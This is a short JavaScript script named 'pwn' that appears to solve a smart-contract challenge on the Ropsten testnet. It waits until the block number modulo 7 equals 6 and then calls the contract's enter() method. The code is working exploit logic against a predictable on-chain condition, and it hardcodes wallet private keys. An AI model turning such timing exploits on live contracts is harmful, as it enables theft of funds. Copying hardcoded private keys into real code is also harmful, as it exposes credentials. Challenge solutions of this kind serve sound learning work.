const SimpleWallet = require('./SimpleWallet');

(async function pwn() {
  //var privateKey =
    //'8115BF21F49FD36BD384827A830E843C9B4951DD663D9F60196A3BBEA2237619';
  //var publicKey = '0x70c0D1904aa32a40d146c9C45a7CB883ea7fE84C';

  var privateKey = "1CE6A4CC4C9941A4781349F988E129ACCDC35A55BB3D5B1A7B342BC2171DB484";
  var publicKey = "0x26006236eaB6409D9FDECb16ed841033d6B4A6bC";

  var wallet = new SimpleWallet(privateKey, publicKey, 'https://ropsten.infura.io');

  var contract = await wallet.loadContract('EnterAgain');
  //var entrance = await wallet.loadContract('Entrance');
  var blockNumber = await wallet.web3.eth.getBlockNumber();
  console.log(blockNumber, blockNumber % 7);
  if (blockNumber % 7 !== 6) {
    return;
  }
  try {
    const tx = await wallet.send(contract.methods.enter());
    console.log(tx);
  } catch (e) {
    console.log(e);
    // noop
  }

  //var balance = await wallet.call(
  //  entrance.methods.balanceOf('0x7d39b75086ad2e5ea5c3aa49fcf5c2e3b6de5ced'),
  //);
  //console.log(balance);
})();
